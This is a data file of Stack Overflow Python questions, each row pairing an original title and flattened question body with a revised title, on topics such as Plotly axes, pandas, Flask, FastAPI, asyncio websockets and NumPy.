How to add multiple y axis in plotly?," I have data with 5 different columns and their value varies from each other. So in from this data I want to plot a graph with 3 y-axis. One for the frequency, second for the Total Gen and third is for Actual gen, Storage and Solar Gen.Frequency should be on the secondary Y-axis(Right side) and the Rest of them should be on the left side.For frequency as you can see the values are very random between 47 to 52 that's why it should be on the right side, like this:For Total Gen value are very high as compared to others as they are from 100-20000 so that's I can't merge them with others, something like this:Here I want:Y-axis title 1 = Actual gen, Storage, and Solar genY-axis title 2 = Total genY-axis title 3 = FrequencyMy approach: Can someone please help? <code>  Actual gen Storage Solar Gen Total Gen Frequency 1464 1838 1804 18266 51 2330 2262 518 4900 51 2195 923 919 8732 49 2036 1249 1316 3438 48 2910 534 1212 4271 47 857 2452 1272 6466 50 2331 990 2729 14083 51 2604 767 2730 19037 47 993 2606 705 17314 51 2542 213 548 10584 52 2030 942 304 11578 52 562 414 2870 840 52 1111 1323 337 19612 49 1863 2498 1992 18941 48 1575 2262 1576 3322 48 1223 657 661 10292 47 1850 1920 2986 10130 48 2786 1119 933 2680 52 2333 1245 1909 14116 48 1606 2934 1547 13767 51 import loggingimport pandas as pdimport plotly.graph_objs as goimport plotly.offline as pyoimport xlwings as xwfrom plotly.subplots import make_subplotsapp = xw.App(visible=False)try: wb = app.books.open('2020 10 08 0000 (Float).xlsx') sheet = wb.sheets[0] actual_gen = sheet.range('A2:A21').value frequency = sheet.range('E2:E21').value storage = sheet.range('B2:B21').value total_gen = sheet.range('D2:D21').value solar_gen = sheet.range('C2:C21').valueexcept Exception as e: logging.exception(""Something awful happened!"") print(e)finally: app.quit() app.kill()# Create figure with secondary y-axisfig = make_subplots(specs=[[{""secondary_y"": True}]])# Add tracesfig.add_trace( go.Scatter(y=storage, name=""BESS(KW)""),)fig.add_trace( go.Scatter(y=actual_gen, name=""Act(KW)""),)fig.add_trace( go.Scatter(y=solar_gen, name=""Solar Gen""))fig.add_trace( go.Scatter(x=x_values, y=total_gen, name=""Total Gen"",yaxis = 'y2'))fig.add_trace( go.Scatter(y=frequency, name=""Frequency"",yaxis = 'y1'),)fig.update_layout( title_text = '8th oct BESS', yaxis2=dict(title=""BESS(KW)"",titlefont=dict(color=""red""), tickfont=dict(color=""red"")), yaxis3=dict(title=""Actual Gen(KW)"",titlefont=dict(color=""orange""),tickfont=dict(color=""orange""), anchor=""free"", overlaying=""y2"", side=""left""), yaxis4=dict(title=""Solar Gen(KW)"",titlefont=dict(color=""pink""),tickfont=dict(color=""pink""), anchor=""x2"",overlaying=""y2"", side=""left""), yaxis5=dict(title=""Total Gen(KW)"",titlefont=dict(color=""cyan""),tickfont=dict(color=""cyan""), anchor=""free"",overlaying=""y2"", side=""left""), yaxis6=dict(title=""Frequency"",titlefont=dict(color=""purple""),tickfont=dict(color=""purple""), anchor=""free"",overlaying=""y2"", side=""right""))fig.show()",Plotly: How to add multiple y-axes?
How to select the hue order in Seaborn plots?," I am new to Seaborn and this is probably a very trivial question, however I'm struggling with the solution. I have a Pandas dataset named titanic I am plotting a bar chart as described in the Seaborn official documentation, using the following code: This produces the following plot:As you can see, the hue is represented by the class. Question is: How can I manually choose the hue order so that I can reverse the current one? <code>  import seaborn as snstitanic = sns.load_dataset(""titanic"")sns.catplot(x=""sex"", y=""survived"", hue=""class"", kind=""bar"", data=titanic)",How to set the hue order in Seaborn plots
How to change the hue order in Seaborn plots?," I am new to Seaborn and this is probably a very trivial question, however I'm struggling with the solution. I have a Pandas dataset named titanic I am plotting a bar chart as described in the Seaborn official documentation, using the following code: This produces the following plot:As you can see, the hue is represented by the class. Question is: How can I manually choose the hue order so that I can reverse the current one? <code>  import seaborn as snstitanic = sns.load_dataset(""titanic"")sns.catplot(x=""sex"", y=""survived"", hue=""class"", kind=""bar"", data=titanic)",How to set the hue order in Seaborn plots
Python dataclass - How to define a dataclass so each of its attributes is the list of its subclass attributes?," I have this code: How can I create additional attributes in the dataclass Section so they would be a list of the attribute of its subclass Position?In my example, I would like that the section object also returns: I tried to define the dataclass as: But it is not working because name is not an attribute of position. I can define the object attributed later in the code (e.g. by doing secs.name = [x.name for x in section.positions]). But it would be nicer if it can be done at the dataclass definition level.After posting this question I found a beginning of answer (https://stackoverflow.com/a/65222586/13890678).But I was wondering if there was not a more generic/""automatic"" way of defining the Section methods : .names(), .lons(), .lats(), ... ? So the developer doesn't have to define each method individually but instead, these methods are created based on the Positions object attributes? <code>  from dataclasses import dataclassfrom typing import List@dataclassclass Position: name: str lon: float lat: float@dataclassclass Section: positions: List[Position]pos1 = Position('a', 52, 10)pos2 = Position('b', 46, -10)pos3 = Position('c', 45, -10)sec = Section([pos1, pos2 , pos3])print(sec.positions) sec.name = ['a', 'b', 'c'] #[pos1.name,pos2.name,pos3.name]sec.lon = [52, 46, 45] #[pos1.lon,pos2.lon,pos3.lon]sec.lat = [10, -10, -10] #[pos1.lat,pos2.lat,pos3.lat] @dataclassclass Section: positions: List[Position] names : List[Position.name]",How to define a dataclass so each of its attributes is the list of its subclass attributes?
Displaying html file at FastAPI endpoint," Is it possible to display an HTML file at the endpoint?For example the home page then the user is visiting ""/""? <code> ",How to return a HTMLResponse with FastAPI
Pandas: how to make a column based on previous values in dataframe, I have a data frame: I want to create a column that will show the fact of visiting this URL before.Desired output: I can do this with a loop but it doesn't look good. Is it possible to make it with pandas? <code>  user_id url111 google.com111 youtube.com111 youtube.com111 google.com111 stackoverflow.com111 google.com222 twitter.com222 google.com222 twitter.com user_id url target111 google.com 0111 youtube.com 0111 youtube.com 1111 google.com 1111 stackoverflow.com 0111 google.com 1222 twitter.com 0222 google.com 0222 twitter.com 1,How to make a column based on previous values in dataframe
A function that returns the frequency counts of all columns in a new dataframe for each column," I can return the frequency of all columns in a nice dataframe with a total column. I put the loop in a function, but this returns the first column ""Count"" only. Is there a way to do this using slicing or other method e.g. for column in dataframe_x[1:]: <code>  for column in df: df.groupby(column).size().reset_index(name=""total"")Count total0 1 4231 2 4882 3 4543 4 4084 5 343Precipitation total0 Fine 74901 Fog 232 Other 513 Raining 808Month total0 1 7171 2 6482 3 7103 4 701 def count_all_columns_freq(dataframe_x): for column in dataframe_x: return dataframe_x.groupby(column).size().reset_index(name=""total"")count_all_columns_freq(df)Count total0 1 4231 2 4882 3 4543 4 4084 5 343",A function to return the frequency counts of all or specific columns
A function that returns the frequency counts of all columns via slicing," I can return the frequency of all columns in a nice dataframe with a total column. I put the loop in a function, but this returns the first column ""Count"" only. Is there a way to do this using slicing or other method e.g. for column in dataframe_x[1:]: <code>  for column in df: df.groupby(column).size().reset_index(name=""total"")Count total0 1 4231 2 4882 3 4543 4 4084 5 343Precipitation total0 Fine 74901 Fog 232 Other 513 Raining 808Month total0 1 7171 2 6482 3 7103 4 701 def count_all_columns_freq(dataframe_x): for column in dataframe_x: return dataframe_x.groupby(column).size().reset_index(name=""total"")count_all_columns_freq(df)Count total0 1 4231 2 4882 3 4543 4 4084 5 343",A function to return the frequency counts of all or specific columns
(Discord Bot) How to make bot delete his own message after some time?," I have this code in Python: And I want the bot to delete its own message. For example, after one minute, how do I do it? <code>  import discordclient = commands.Bot(command_prefix='!')@client.eventasync def on_voice_state_update(member): channel = client.get_channel(channels_id_where_i_want_to_send_message)) response = f'Hello {member}!' await channel.send(response)client.run('bots_token')",(Discord.py) How to make bot delete his own message after some time?
"Find common rows in two dataframe when the difference indexed column is in range [-5,5]"," I have two data frames df1 and df2 as shown below: My final answer should be: How do I find common rows from both the data frame using Date BillNo. Amount when the difference in value range is between [-5,5]?I know how to find common rows by using: However, this doesn't give the rows which are in range. Anyone who could help?Edit: We can see in df1: 10/14/2020,AC9268RE3,198 and df2: 10/14/2020,AC9268RE3,212 the difference is 14, hence this should not be included in common rows <code>  df1Date BillNo. Amount10/08/2020 ABBCSQ1ZA 87810/09/2020 AADC9C1Z5 1110/12/2020 AC928Q1ZS 399810/14/2020 AC9268RE3 19810/16/2020 AA171E1Z0 549010/19/2020 BU073C1ZW 3432df2Date BillNo. Amount10/08/2020 ABBCSQ1ZA 87610/11/2020 ATRC95REW 11510/14/2020 AC9268RE3 21210/16/2020 AA171E1Z0 549110/25/2020 BPO66W2LO 344 finalDate BillNo. Amount10/08/2020 ABBCSQ1ZA 87610/16/2020 AA171E1Z0 5491 df_all = df1.merge(df2.drop_duplicates(), on=['Date', 'BillNo.', 'Amount'], how='outer', indicator=True)","Join two DataFrames on common columns only if the difference in a separate column is within range [-n, +n]"
Python - requests cannot parse response if file upload fails prematurely," I'm using the requests (which uses urllib3 and the Python http module under the hood) library to upload a file from a Python script.My backend starts by inspecting the headers of the request and if it doesn't comply with the needed prerequisites, it stops the request right away and respond with a valid 400 response.This behavior works fine in Postman, or with Curl; i.e. the client is able to parse the 400 response even though it hasn't completed the upload and the server answers prematurely.However, while doing so in Python with requests/urllib3, the library is unable to process the backend response : Because the server answers before the transfer is complete, it mistakenly considers that the connection has been aborted, even though the server DOES return a valid response.Is there a way to avoid this and parse the response nonetheless ?Steps to reproduce the issue :Download minIO : https://min.io/download#/Run minIO : Run the following script : If you change the request line with this, it will work (i.e. the server returns 400 and the client is able to parse it) : EDIT : I updated the traceback and changed the question title to reflect the fact that it's neither requests or urllib3 fault, but the Python http module that is used by both of them. <code>  Traceback (most recent call last): File ""C:\Users\Neumann\AppData\Local\Packages\PythonSoftwareFoundation.Python.3.8_qbz5n2kfra8p0\LocalCache\local-packages\Python38\site-packages\urllib3\connectionpool.py"", line 670, in urlopen httplib_response = self._make_request( File ""C:\Users\Neumann\AppData\Local\Packages\PythonSoftwareFoundation.Python.3.8_qbz5n2kfra8p0\LocalCache\local-packages\Python38\site-packages\urllib3\connectionpool.py"", line 392, in _make_request conn.request(method, url, **httplib_request_kw) File ""C:\Program Files\WindowsApps\PythonSoftwareFoundation.Python.3.8_3.8.1776.0_x64__qbz5n2kfra8p0\lib\http\client.py"", line 1255, in request self._send_request(method, url, body, headers, encode_chunked) File ""C:\Program Files\WindowsApps\PythonSoftwareFoundation.Python.3.8_3.8.1776.0_x64__qbz5n2kfra8p0\lib\http\client.py"", line 1301, in _send_request self.endheaders(body, encode_chunked=encode_chunked) File ""C:\Program Files\WindowsApps\PythonSoftwareFoundation.Python.3.8_3.8.1776.0_x64__qbz5n2kfra8p0\lib\http\client.py"", line 1250, in endheaders self._send_output(message_body, encode_chunked=encode_chunked) File ""C:\Program Files\WindowsApps\PythonSoftwareFoundation.Python.3.8_3.8.1776.0_x64__qbz5n2kfra8p0\lib\http\client.py"", line 1049, in _send_output self.send(chunk) File ""C:\Program Files\WindowsApps\PythonSoftwareFoundation.Python.3.8_3.8.1776.0_x64__qbz5n2kfra8p0\lib\http\client.py"", line 971, in send self.sock.sendall(data)ConnectionResetError: [WinError 10054] Une connexion existante a d tre ferme par lhte distant export MINIO_ACCESS_KEY=<access_key>export MINIO_SECRET_KEY=<secret_key>.\minio.exe server <data folder> import osimport sysimport requestsfrom requests_toolbelt.multipart.encoder import MultipartEncoderdef fatal(msg): print(msg) sys.exit(1)def upload_file(): mp_encoder = MultipartEncoder(fields={'file': (open('E:/Downloads/kek.mp3', 'rb'))}) headers = { ""Authorization"": ""invalid"" } print('Uploading file with headers : ' + str(headers)) upload_endpoint = 'http://localhost:9000/mybucket/myobject' try: r = requests.put(upload_endpoint, headers=headers, data=mp_encoder, verify=False) except requests.exceptions.ConnectionError as e: print(e.status) for property, value in vars(e).items(): print(property, "":"", value) fatal(str(e)) if r.status_code != 201: for property, value in vars(r).items(): print(property, "":"", value) fatal('Error while uploading file. Status ' + str(r.status_code)) print('Upload successfully completed')if __name__ == ""__main__"": upload_file() r = requests.put(upload_endpoint, headers=headers, data='a string', verify=False)",Python - HTTP module cannot parse response if the server answers before the PUT is complete
Python - urllib3 cannot parse response if the server answers before the POST is complete," I'm using the requests (which uses urllib3 and the Python http module under the hood) library to upload a file from a Python script.My backend starts by inspecting the headers of the request and if it doesn't comply with the needed prerequisites, it stops the request right away and respond with a valid 400 response.This behavior works fine in Postman, or with Curl; i.e. the client is able to parse the 400 response even though it hasn't completed the upload and the server answers prematurely.However, while doing so in Python with requests/urllib3, the library is unable to process the backend response : Because the server answers before the transfer is complete, it mistakenly considers that the connection has been aborted, even though the server DOES return a valid response.Is there a way to avoid this and parse the response nonetheless ?Steps to reproduce the issue :Download minIO : https://min.io/download#/Run minIO : Run the following script : If you change the request line with this, it will work (i.e. the server returns 400 and the client is able to parse it) : EDIT : I updated the traceback and changed the question title to reflect the fact that it's neither requests or urllib3 fault, but the Python http module that is used by both of them. <code>  Traceback (most recent call last): File ""C:\Users\Neumann\AppData\Local\Packages\PythonSoftwareFoundation.Python.3.8_qbz5n2kfra8p0\LocalCache\local-packages\Python38\site-packages\urllib3\connectionpool.py"", line 670, in urlopen httplib_response = self._make_request( File ""C:\Users\Neumann\AppData\Local\Packages\PythonSoftwareFoundation.Python.3.8_qbz5n2kfra8p0\LocalCache\local-packages\Python38\site-packages\urllib3\connectionpool.py"", line 392, in _make_request conn.request(method, url, **httplib_request_kw) File ""C:\Program Files\WindowsApps\PythonSoftwareFoundation.Python.3.8_3.8.1776.0_x64__qbz5n2kfra8p0\lib\http\client.py"", line 1255, in request self._send_request(method, url, body, headers, encode_chunked) File ""C:\Program Files\WindowsApps\PythonSoftwareFoundation.Python.3.8_3.8.1776.0_x64__qbz5n2kfra8p0\lib\http\client.py"", line 1301, in _send_request self.endheaders(body, encode_chunked=encode_chunked) File ""C:\Program Files\WindowsApps\PythonSoftwareFoundation.Python.3.8_3.8.1776.0_x64__qbz5n2kfra8p0\lib\http\client.py"", line 1250, in endheaders self._send_output(message_body, encode_chunked=encode_chunked) File ""C:\Program Files\WindowsApps\PythonSoftwareFoundation.Python.3.8_3.8.1776.0_x64__qbz5n2kfra8p0\lib\http\client.py"", line 1049, in _send_output self.send(chunk) File ""C:\Program Files\WindowsApps\PythonSoftwareFoundation.Python.3.8_3.8.1776.0_x64__qbz5n2kfra8p0\lib\http\client.py"", line 971, in send self.sock.sendall(data)ConnectionResetError: [WinError 10054] Une connexion existante a d tre ferme par lhte distant export MINIO_ACCESS_KEY=<access_key>export MINIO_SECRET_KEY=<secret_key>.\minio.exe server <data folder> import osimport sysimport requestsfrom requests_toolbelt.multipart.encoder import MultipartEncoderdef fatal(msg): print(msg) sys.exit(1)def upload_file(): mp_encoder = MultipartEncoder(fields={'file': (open('E:/Downloads/kek.mp3', 'rb'))}) headers = { ""Authorization"": ""invalid"" } print('Uploading file with headers : ' + str(headers)) upload_endpoint = 'http://localhost:9000/mybucket/myobject' try: r = requests.put(upload_endpoint, headers=headers, data=mp_encoder, verify=False) except requests.exceptions.ConnectionError as e: print(e.status) for property, value in vars(e).items(): print(property, "":"", value) fatal(str(e)) if r.status_code != 201: for property, value in vars(r).items(): print(property, "":"", value) fatal('Error while uploading file. Status ' + str(r.status_code)) print('Upload successfully completed')if __name__ == ""__main__"": upload_file() r = requests.put(upload_endpoint, headers=headers, data='a string', verify=False)",Python - HTTP module cannot parse response if the server answers before the PUT is complete
"Tortoise ORM for Python return relations of entities (Pyndantic, FastAPI)"," I was making a sample Fast Api server with Tortoise ORM as an asynchronous orm library, but I just cannot seem to return the relations I have defined. These are my relations: The tables have been created correctly. When adding keywords to categories the db state is all good. The problem is when i want to query the categories and include the keywords. I have this code for that: Debugging the category_orm here I have the following:category_orm debug at run-timeWhich kind of tells me that they are loaded.Then when i cant a Pydantic model I have this code and debugging this, there is no keywords fieldcategory (pydantic) debug at run-timeLooking at the source code of tortoise orm for the function from_tortoise_orm But my relation is just not returned. Anyone have a similar experience ? <code>  # Categoryfrom tortoise.fields.data import DatetimeFieldfrom tortoise.models import Modelfrom tortoise.fields import UUIDField, CharFieldfrom tortoise.fields.relational import ManyToManyFieldfrom tortoise.contrib.pydantic import pydantic_model_creatorclass Category(Model): id = UUIDField(pk=True) name = CharField(max_length=255) description = CharField(max_length=255) keywords = ManyToManyField( ""models.Keyword"", related_name=""categories"", through=""category_keywords"" ) created_on = DatetimeField(auto_now_add=True) updated_on = DatetimeField(auto_now=True)Category_dto = pydantic_model_creator(Category, name=""Category"", allow_cycles = True) # Keywordfrom models.expense import Expensefrom models.category import Categoryfrom tortoise.fields.data import DatetimeFieldfrom tortoise.fields.relational import ManyToManyRelationfrom tortoise.models import Modelfrom tortoise.fields import UUIDField, CharFieldfrom tortoise.contrib.pydantic import pydantic_model_creatorclass Keyword(Model): id = UUIDField(pk=True) name = CharField(max_length=255) description = CharField(max_length=255) categories: ManyToManyRelation[Category] expenses: ManyToManyRelation[Expense] created_on = DatetimeField(auto_now_add=True) updated_on = DatetimeField(auto_now=True) class Meta: table=""keyword""Keyword_dto = pydantic_model_creator(Keyword) class CategoryRepository(): @staticmethod async def get_one(id: str) -> Category: category_orm = await Category.get_or_none(id=id).prefetch_related('keywords') if (category_orm is None): raise NotFoundHTTP('Category') return category_orm class CategoryUseCases(): @staticmethod async def get_one(id: str) -> Category_dto: category_orm = await CategoryRepository.get_one(id) category = await Category_dto.from_tortoise_orm(category_orm) return category @classmethod async def from_tortoise_orm(cls, obj: ""Model"") -> ""PydanticModel"": """""" Returns a serializable pydantic model instance built from the provided model instance. .. note:: This will prefetch all the relations automatically. It is probably what you want.","Tortoise ORM for Python no returns relations of entities (Pyndantic, FastAPI)"
Combine two dictionaries with preference to one of them - Python," I have two dictionariesOne: Two: Now, I want to combine these two dictionaries in such a way that values for the keys present in both the dictionaries are taken from the parsed dictionary and for rest of the keys in default and their values are put in to the new dictionary.For the above given dictionary the newly created dictionary would be, The obvious way to code up this would be to loop through the keys in default and check if that is present in parsed and put then into a new list updated, and in the else clause of the same check we can use values from default.I am not sure if this is a pythonic way to do it or a much cleaner method. Could someone help on this? <code>  default = {""val1"": 10, ""val2"": 20, ""val3"": 30, ""val4"": 40} parsed = {""val1"": 60, ""val2"": 50} updated = {""val1"": 60, ""val2"": 50, ""val3"": 30, ""val4"": 40}",Combine two dictionaries with preference to one of them -
Python3 Flask bool query parameter always true," I have an odd behavior for one of my endpoints in my Flask application which accepts boolean query parameters. No matter what I pass to it, such as asfsdfd or true or false, it is considered true. Only by leaving it empty does it become false. It seems to be that either any input is considered to be true. Is there any way to make this work with the Flask intended way of defining the type, or do I need to accept a string and compare it? <code>  full_info = request.args.get(""fullInfo"", default=False, type=bool)if full_info: # do stuff",Why does the Flask bool query parameter always evaluate to true?
Why the following code is printing 5 instead of 6?, I am learning Python from the official documentation. There I find the above piece of code which I am unable to understand as to why 5 is printed instead of 6. I am relatively new to Python. Can somebody help me understand the concept? <code>  i = 5def f(arg=i): print(arg)i = 6f(),Why can't I change the default value of a function after it was defined?
Get all members discord.py," I've got a question, I need to get a list from all members from all servers where the bot is online(I'm using discord.py rewrite), Right now I have this code-snipped: The program outputs the Bots name 3 times because the bot is on 3 servers.Thank you! <code>  @bot.command()async def members(ctx): for guild in bot.guilds: for member in guild.members: print(member)",Get all members discord.py [ANSWERED]
Plotly how to round display text in create_annotated_heatmap?," I am drawing a correlation matrix of the Titanic dataset. Originally, the matrix looks like this: I want to round the float number, so they display less digits after the . dot.The current workaround is actually round the pandas dataframe before input. But the workaround also rounds the text when I hover mouse over. I want hover text in full detail while display text are round.Can I display less digits on each cell without changing the input dataframe ? <code>  df_corr = df.corr() fig = ff.create_annotated_heatmap( z=df_corr.to_numpy(), x=df_corr.columns.tolist(), y=df_corr.index.tolist(), zmax=1, zmin=-1, showscale=True, hoverongaps=True )# add titlefig.update_layout(title_text='<i><b>Correlation not round</b></i>') df_corr_round = df_corr.round(3)fig = ff.create_annotated_heatmap( z=df_corr_round.to_numpy(), x=df_corr.columns.tolist(), y=df_corr.index.tolist(), zmax=1, zmin=-1, showscale=True, hoverongaps=True )# add titlefig.update_layout(title_text='<i><b>Correlation round</b></i>')",Plotly: How to round display text in annotated heatmap but keep full format on hover?
Plotly: How to round display text in create_annotated_heatmap?," I am drawing a correlation matrix of the Titanic dataset. Originally, the matrix looks like this: I want to round the float number, so they display less digits after the . dot.The current workaround is actually round the pandas dataframe before input. But the workaround also rounds the text when I hover mouse over. I want hover text in full detail while display text are round.Can I display less digits on each cell without changing the input dataframe ? <code>  df_corr = df.corr() fig = ff.create_annotated_heatmap( z=df_corr.to_numpy(), x=df_corr.columns.tolist(), y=df_corr.index.tolist(), zmax=1, zmin=-1, showscale=True, hoverongaps=True )# add titlefig.update_layout(title_text='<i><b>Correlation not round</b></i>') df_corr_round = df_corr.round(3)fig = ff.create_annotated_heatmap( z=df_corr_round.to_numpy(), x=df_corr.columns.tolist(), y=df_corr.index.tolist(), zmax=1, zmin=-1, showscale=True, hoverongaps=True )# add titlefig.update_layout(title_text='<i><b>Correlation round</b></i>')",Plotly: How to round display text in annotated heatmap but keep full format on hover?
moving zeros (without sort ) to left python," I want to just move the zero's to left and don't want to sort the list.For example, if my list is like: Here's the output which I desire after moving all the Zero's to left: Here's the code I tried: This code gives me output as: But my desired output is: <code>  nums = [1, 10, 20, 0, 59, 63, 0, 8, 0] output = [0, 0, 0, 1, 10, 20, 59, 63, 8] class Solution: def moveZeroes(self, nums): c = 0 for i in range(len(nums)): if nums[i] != 0: nums[i], nums[c] = nums[c], nums[i] c += 1 return numsprint(Solution().moveZeroes(nums)) [1, 10, 20, 59, 63, 8, 0, 0, 0] [0, 0, 0, 1, 10, 20, 59, 63, 8]",Moving specific number (without sort) to the left of list
Why does my numpy logspace give me an infinity array?," To get a logarithmic array of 1000 until 1000000000 with 23 points I wrote this code in Python: The results where: How do you solve this problem and what did I do wrong in my code? <code>  import numpy as npx4 = np.logspace(start=1000, stop=1000000000, num=23, base=10)print(x4) [inf inf inf inf inf inf inf inf inf inf inf inf inf inf inf inf inf inf inf inf inf inf inf]",Why does my NumPy logspace give me an infinity array?
Why does my NumPy logspace give me an infinity array?," To get a logarithmic array of 1000 until 1000000000 with 23 points I wrote this code in Python: The results where: How do you solve this problem and what did I do wrong in my code? <code>  import numpy as npx4 = np.logspace(start=1000, stop=1000000000, num=23, base=10)print(x4) [inf inf inf inf inf inf inf inf inf inf inf inf inf inf inf inf inf inf inf inf inf inf inf]",Why does my NumPy logspace give me an infinity array?
Don't know what decorator to use in Python, What's the difference between @dataclass(frozen=True) and @dataclass(frozen=False)? When should I use which? <code> ,What does frozen mean for dataclasses?
TypeError: Object of type function is not JSON serializable when using flask_jwt_extended," I'm building a REST API using flask. I'm using postman for testing a route that creates a new item in my database, but only if the user is logged in. The routes for registering and login are working well, the last one returns the token using flask_jwt_extended module. When I send a post request to my ""/api/notes"" (creates a new note in database) I get the error bellow:"" (...) raise TypeError(f'Object of type {o.class.name} 'TypeError: Object of type function is not JSON serializable""for the request I'm using the authorization tab of postman. type: Bearer Token, and my token in the field (tried with and without quotation marks)I had faced this error this morning, before implementing my one-many relantionship, but I got it working by replacing my VERY_LONG_TOKEN with ""VERY_LONG_TOKEN"" in the Barear token field. I thought that because the token includes dots, it was interpreting as a function. But after implementing the relationship, I went to test and got this error again.my note.py file: my models.py: init.py: resources/routes.py: folder structure: body of my post request: Did anyone faced it before or know how to solve it?Edit: added more code info <code>  from flask import request, Response, jsonifyfrom app.models import User, Notefrom flask_restful import Resourcefrom flask_jwt_extended import jwt_required, get_jwt_identityclass NotesApi(Resource): def get(self): notes = Note.objects().to_json() return Response(notes, mimetype=""application/json"", status=200) @jwt_required def post(self): # post method I'm making a request for print(""fool"") # this doesn't get printed -> not reaching user_id = get_jwt_identity() data = request.get_json(force=True) if data: user = User.objects(id=user_id) # logged in user note = Note(**data, user_author=user) # creates note with the author note.save() user.update(push__notes=note) # add this note to users notes user.save() id = str(note.id) return {'id': id}, 200 else: return {'error': 'missing data'}, 400 from app import db # using mongodbfrom datetime import datetimefrom flask_bcrypt import generate_password_hash, check_password_hashclass Note(db.Document): title = db.StringField(max_length=120,required=True) content = db.StringField(required=True) status = db.BooleanField(required=True, default=False) date_modified = db.DateTimeField(default=datetime.utcnow) user_author = db.ReferenceField('User') class User(db.Document): username = db.StringField(max_length=100, required=True, unique=True) email = db.StringField(max_length=120, required=True, unique=True) password = db.StringField(required=True) remember_me = db.BooleanField(default=False) notes = db.ListField(db.ReferenceField('Note', reverse_delete_rule=db.PULL)) # one-many relationship def hash_password(self): self.password = generate_password_hash(self.password).decode('utf8') def check_password(self, password): return check_password_hash(self.password, password)User.register_delete_rule(Note, 'user_author', db.CASCADE) from flask import Flaskfrom config import Config # my config class to set MONGOBD_HOST and SECRET_CLASSfrom flask_mongoengine import MongoEnginefrom flask_restful import Apifrom flask_bcrypt import Bcryptfrom flask_jwt_extended import JWTManagerapp = Flask(__name__)app.config.from_object(Config)db = MongoEngine(app)api = Api(app)bcrypt = Bcrypt(app)jwt = JWTManager(app)from app.resources.routes import initialize_routesinitialize_routes(api) from .note import NotesApi, NoteApifrom .auth import SignupApi, LoginApidef initialize_routes(api): api.add_resource(NotesApi, '/api/notes') api.add_resource(NoteApi, '/api/note/<id>') api.add_resource(SignupApi, '/api/auth/signup') api.add_resource(LoginApi, '/api/auth/login') app |_ resources |_ auth.py # signup working well, login also working, return a token (type = String) |_ note.py |_ routes.py |_ __init__.py |_ models.pyconfig.pyappname.py #just import app and do a app.run() { ""title"": ""test0"", ""content"": ""test0"" }",TypeError: Object of type function is not JSON serializable when using flask_jwt_extended int RESTful API
how to pass video stream from one python to another," In my previous post, we found a way to pass an image file from one Python to another:pass video data from one python script to anotherI am now trying to pass a video (successive images):write.py read.py: If I output the write.py data to terminal, it prints. If I manually hand data to read.py that gets read. But put them together (python3 write.py | python3 read.py) and it just hangs. write.py just writes once, and read.py never seems to get it.My guess is that the read code is waiting for the write code to ""end"" before it wraps up the data package and calls it an image. Though if that were the case, I would think it that doing a flush would fix it. <code>  import sysimport numpy as npimport cv2from PIL import Imageimport ioimport timewhile True: img = cv2.imread('cat.jpg') bimg = cv2.imencode('.jpg',img)[1] sys.stdout.buffer.write(bimg) sys.stdout.flush() time.sleep(1) import sysfrom PIL import Imageimport ioimport cv2import numpy as npfrom io import BytesIO while True: data = sys.stdin.buffer.read() img_np = cv2.imdecode(np.frombuffer(BytesIO(data).read(), np.uint8), cv2.IMREAD_UNCHANGED) cv2.imshow('image', img_np) cv2.waitKey(0)",How to pass video stream from one Python to another?
How to pass video stream from one python to another?," In my previous post, we found a way to pass an image file from one Python to another:pass video data from one python script to anotherI am now trying to pass a video (successive images):write.py read.py: If I output the write.py data to terminal, it prints. If I manually hand data to read.py that gets read. But put them together (python3 write.py | python3 read.py) and it just hangs. write.py just writes once, and read.py never seems to get it.My guess is that the read code is waiting for the write code to ""end"" before it wraps up the data package and calls it an image. Though if that were the case, I would think it that doing a flush would fix it. <code>  import sysimport numpy as npimport cv2from PIL import Imageimport ioimport timewhile True: img = cv2.imread('cat.jpg') bimg = cv2.imencode('.jpg',img)[1] sys.stdout.buffer.write(bimg) sys.stdout.flush() time.sleep(1) import sysfrom PIL import Imageimport ioimport cv2import numpy as npfrom io import BytesIO while True: data = sys.stdin.buffer.read() img_np = cv2.imdecode(np.frombuffer(BytesIO(data).read(), np.uint8), cv2.IMREAD_UNCHANGED) cv2.imshow('image', img_np) cv2.waitKey(0)",How to pass video stream from one Python to another?
Python: How to handle multiple websocket messages at the same time?," If anyone could help me with Python and async/await, any help would be much appreciated!I need to listen to a websocket for messages, so I set up the following code: What I would like to do is:Listen to messagesAs soon as a message arrives, apply various actions with on_message() function, for several minutesKeep listening to messages while previous messages are still in process with on_message()What actually happens:Listen to messagesReceive a message and start on_message() functionAnd then program is waiting for on_message() function to end before receiving any new message, which takes a few minutes, and make the second message late and so onI do understand why it does this, as await on_message() clearly says : wait for on_message() to end so it won't go back to listen for new message. The thing I don't know, is how I could handle messages without having to wait for this function to end.My on_message() function has a lot of idle time with some await asyncio.sleep(1), so I know that I can run multiple task in the same time.So, how could I keep be listening to new messages while running tasks for the first one? <code>  import websocketsimport asynciomy_socket = ""ws://.......""# I set a ""while True"" here to reconnect websocket if it stop for any reasonwhile True: try: async with websockets.connect(my_socket) as ws: # I set a ""while True"" here to keep listening to messages forever while True: await on_message(await ws.recv()) # If websocket gets closed for any reason, we catch exception and wait before new loop except Exception as e: print(e) # Wait 10 secs before new loop to avoid flooding server if it is unavailable for any reason await asyncio.sleep(10)async def on_message(message): # Do what needs to be done with received message # This function is running for a few minutes, with a lot of sleep() time in it.. # .. so it does no hold process for itself",How to handle multiple websocket messages at the same time?
Differences in Euclidean-Norm of matrix calculation in Python," I'm attempting to compute the Euclidean distance between two matricies which I would expect to be given by the square root of the element-wise sum of squared differences.This seems to me to be exactly the calculation computed by numpy's linalg.norm function, however it doesn't appear to match my expected result.For example this code returns different values (5.385 vs 5.339) Have I misinterpreted the linalg.norm function? Why are the two above calculation methodologies not returning the same value? <code>  import numpy as npa = np.arange(6).reshape(2, 3)b = np.array([[1,2,3], [-1,1,4]])print(np.sqrt(np.sum(np.square(a-b))))print(np.linalg.norm(a-b, 2))",np.linalg.norm ord=2 not giving Euclidean norm
Differences in Euclidean-Norm of matrix calculation," I'm attempting to compute the Euclidean distance between two matricies which I would expect to be given by the square root of the element-wise sum of squared differences.This seems to me to be exactly the calculation computed by numpy's linalg.norm function, however it doesn't appear to match my expected result.For example this code returns different values (5.385 vs 5.339) Have I misinterpreted the linalg.norm function? Why are the two above calculation methodologies not returning the same value? <code>  import numpy as npa = np.arange(6).reshape(2, 3)b = np.array([[1,2,3], [-1,1,4]])print(np.sqrt(np.sum(np.square(a-b))))print(np.linalg.norm(a-b, 2))",np.linalg.norm ord=2 not giving Euclidean norm
